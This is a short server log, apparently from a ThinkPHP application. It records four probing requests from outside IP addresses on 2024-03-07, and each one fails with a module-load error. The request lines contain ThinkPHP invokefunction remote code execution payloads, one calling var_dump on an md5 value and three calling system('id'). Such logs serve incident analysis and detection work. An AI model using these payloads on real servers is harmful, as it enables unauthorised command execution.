[ 2024-03-07T16:31:01+08:00 ] 192.166.244.194 /index.php?s=index/\think\Container/invokefunction&function=call_user_func_array&vars[0]=var_dump&vars[1][]=((md5(2333))
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000018s ]
INFO: [ app_init ] --END-- [ RunTime:0.000862s ]
ERR: 无法加载模块:Index

[ 2024-03-07T18:00:09+08:00 ] 185.225.234.139 /?s=index/thinkContainer/invokefunction&function=call_user_func_array&vars%5B0%5D=system&vars%5B1%5D%5B%5D=id
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000014s ]
INFO: [ app_init ] --END-- [ RunTime:0.000516s ]
ERR: 无法加载模块:Index

[ 2024-03-07T20:05:34+08:00 ] 185.225.234.139 /?s=index/thinkContainer/invokefunction&function=call_user_func_array&vars%5B0%5D=system&vars%5B1%5D%5B%5D=id
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000050s ]
INFO: [ app_init ] --END-- [ RunTime:0.000596s ]
ERR: 无法加载模块:Index

[ 2024-03-07T22:47:14+08:00 ] 185.225.234.139 /?s=index/thinkapp/invokefunction&function=call_user_func_array&vars%5B0%5D=system&vars%5B1%5D%5B%5D=id
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000005s ]
INFO: [ app_init ] --END-- [ RunTime:0.000497s ]
ERR: 无法加载模块:Index

